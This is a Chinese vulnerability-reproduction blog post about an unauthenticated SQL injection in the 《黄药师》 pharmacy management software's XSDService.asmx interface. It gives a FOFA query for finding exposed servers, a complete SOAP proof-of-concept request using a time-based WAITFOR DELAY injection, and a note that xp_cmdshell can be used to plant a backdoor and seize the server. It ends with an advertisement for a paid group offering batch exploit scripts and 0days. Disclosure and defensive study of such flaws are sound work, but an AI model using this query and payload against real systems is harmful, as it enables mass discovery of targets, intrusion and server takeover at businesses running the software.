#  「漏洞复现」《黄药师》药业管理软件 XSDService.asmx SQL注入漏洞   
冷漠安全  冷漠安全   2024-11-29 02:30  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0pFeDPJNnYaE7pYibBLQrUbLZwqelcotCqhYf0seBKfHroSUm8XuHyka5I3SmicWcJYUpZbFmxJCZ1Q/640?wx_fmt=gif&from=appmsg "")  
  
  
0x01 免责声明  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。工具来自网络，安全性自测，如有侵权请联系删除。本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！！！  
  
0x02  
  
**产品介绍**  
  
《黄药师》药业管理软件是一款针对我国医药或医疗器械企业经营管理特点而设计的综合管理软件。《黄药师》系列管理软件集进销存、财务、经营分析和GSP管理为一体，从企业经营的各个环节对资金流、物流、信息流等进行系统的管理。它采用“一看就懂，一学就会，一用就灵”的开发理念，人机界面友好，易学易用，能满足各类零售药店、连锁配送药店、批发公司以及集团化企业、事业行政单位、大型企业和中小型企业的业务管理需要。  
  
0x03  
  
**漏洞威胁**  
  
《黄药师》药业管理软件 XSDService.asmx 接口GetPdaTable、ExecPdaSql、SetMedia_Picture_info等多个实例存在SQL注入漏洞，未经身份验证的攻击者通过漏洞执行任意SQL语句，调用xp_cmdshell写入后门文件，执行任意代码，从而获取到服务器权限。  
  
0x04  
  
**漏洞环境**  
  
FOFA:  
```
body="XSDService.asmx"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0olLE6dXEOCzCspicInIqc74ecJAX0MSW3eq9hrL6QBTAp9IrKYQC9KMDwJibiasQUJYfdQzYM3gfUog/640?wx_fmt=png&from=appmsg "")  
  
  
0x05  
  
**漏洞复现**  
  
PoC  
```
POST /XSDService.asmx HTTP/1.1
Host: 
Content-Type: text/xml; charset=utf-8
Content-Length: length
SOAPAction: "http://tempuri.org/GetPdaTable"
 
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetPdaTable xmlns="http://tempuri.org/">
      <sql>;WAITFOR DELAY '0:0:4'--</sql>
    </GetPdaTable>
  </soap:Body>
</soap:Envelope>
```  
  
延时  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0olLE6dXEOCzCspicInIqc74H2X45SgWORYbMP2gRPD7RWQ5qj0NSUdZrx2GxsYVKW9Kr5gUlpUXdw/640?wx_fmt=png&from=appmsg "")  
  
  
0x06  
  
**批量脚本验证**  
  
Nuclei验证脚本已发布  
知识星球：冷漠安全  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0olLE6dXEOCzCspicInIqc74vjUhVHnvJ7cnDsEKQflGLNzftZvqY2Rn2cDym9tpboT8xlwDGfDbdQ/640?wx_fmt=png&from=appmsg "")  
  
  
0x07  
  
**修复建议**  
  
关闭互联网暴露面或接口设置访问权限  
  
升级至安全版本  
  
0x08  
  
**加入我们**  
  
漏洞详情及批量检测POC工具请前往知识星球获取  
  
知识星球：冷漠安全交个朋友，限时优惠券：加入立减25星球福利：每天更新最新漏洞POC、资料文献、内部工具等  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0olLE6dXEOCzCspicInIqc74bhesZMnnq1jZAibX6j3HYbd66kqyicKw7NRlicgTEeqtXHl8AXuP5Cr8A/640?wx_fmt=png&from=appmsg "")  
  
  
「星球介绍」：  
  
本星球不割韭菜，不发烂大街东西。欢迎进来白嫖，不满意三天退款。  
  
本星球坚持每天分享一些攻防知识，包括攻防技术、网络安全漏洞预警脚本、网络安全渗透测试工具、解决方案、安全运营、安全体系、安全培训和安全标准等文库。  
  
本星主已加入几十余个付费星球，定期汇聚高质量资料及工具进行星球分享。  
  
  
「星球服务」：  
  
  
加入星球，你会获得：  
  
  
♦ 批量验证漏洞POC脚本  
  
  
♦ 0day、1day分享  
  
  
♦ 汇集其它付费星球资源分享  
  
  
♦ 大量的红蓝对抗实战资源  
  
  
♦ 优秀的内部红蓝工具及插件  
  
  
♦ 综合类别优秀Wiki文库及漏洞库  
  
  
♦ 提问及技术交流  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0olLE6dXEOCzCspicInIqc74NqT3PWLgMTfRWV2gib3JjXT3BzEJ6ic86smUXuAD9VcrSUOGY4pkhlQg/640?wx_fmt=gif&from=appmsg "")  
  
